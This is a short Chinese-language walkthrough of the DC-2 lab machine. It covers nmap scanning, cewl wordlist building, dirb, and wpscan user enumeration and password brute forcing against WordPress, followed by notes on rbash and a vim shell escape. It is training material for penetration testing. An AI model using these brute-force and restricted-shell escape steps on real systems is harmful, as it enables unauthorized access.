DC-2

1.打开kali跟DC-2，设置NAT模式

2.nmap -sn 192.168.243.0/24扫描的得到DC-2的IP192.168.243.134

3.nmap -sT -v 192.168.243.134扫描开放端口得到http

4.访问192.168.243.134，发现找不到服务器，观察界面发现IP被强制转换为域名

5.打开本地hosts文件，路径C:\Windows\System32\drivers\etc\hosts

添加192.168.243.134 dc-2

6.成功访问网站，使用Wappalyzer查看网站信息

7.在网站中找到flag1，提示要用cewl生成字典

8.cewl http://dc-2/ -w pswd.txt 使用cewl爬取网页内容生成密码字典文件，并生成.txt文件

9.dirb http://192.168.243.134/ 挖掘网站隐藏目录，得到网站登录界面http://192.168.243.134/wp-admin

10.wpscan –url http://dc-2/ -e u 枚举用户名，得到三个用户admin,jerry,tom

11.将爆破出的三个用户名保存在user.txt中

12.wpscan –url http://dc-2/ -U user.txt -P pswd.txt 爆得到两个有效账密

13.登录jerry的账号,在page界面找到flag2

注：

1.DC-2靶机强制使用域名访问，在Web服务中做了重定向，即使输入IP，也会跳转到http://dc-2/，需要在hosts文件中加入192.168.243.134 dc-2让系统将域名解析到IP

2.rbash全称 Restricted Bash，是 Bash 的一个“阉割版” shell。

核心目的：给用户一个交互式命令行，但又能最大限度地锁住他，防止越权操作。

3.在 Linux 命令行里，>> 是一个重定向操作符，作用是把命令的输出追加到指定文件的末尾，而不是覆盖原文件

例：

echo “hello” >> file.txt

4.:set shell=/bin/sh
设置内部选项，把选项 shell 改成 /bin/sh

:shell打开一个交互式 shell,执行后 vim 会挂起，暂时进入 /bin/sh（或 set shell= 指定的那个解释器）里，在 shell 里 exit 后又回到 vim。

5.Linux命令目录及用途

目录 用途
/usr/local/bin 本地用户程序，供所有用户使用
/usr/local/sbin 本地系统管理程序（root 专用）
/usr/bin 发行版包管理器安装的普通程序
/usr/sbin 发行版包管理器安装的管理程序
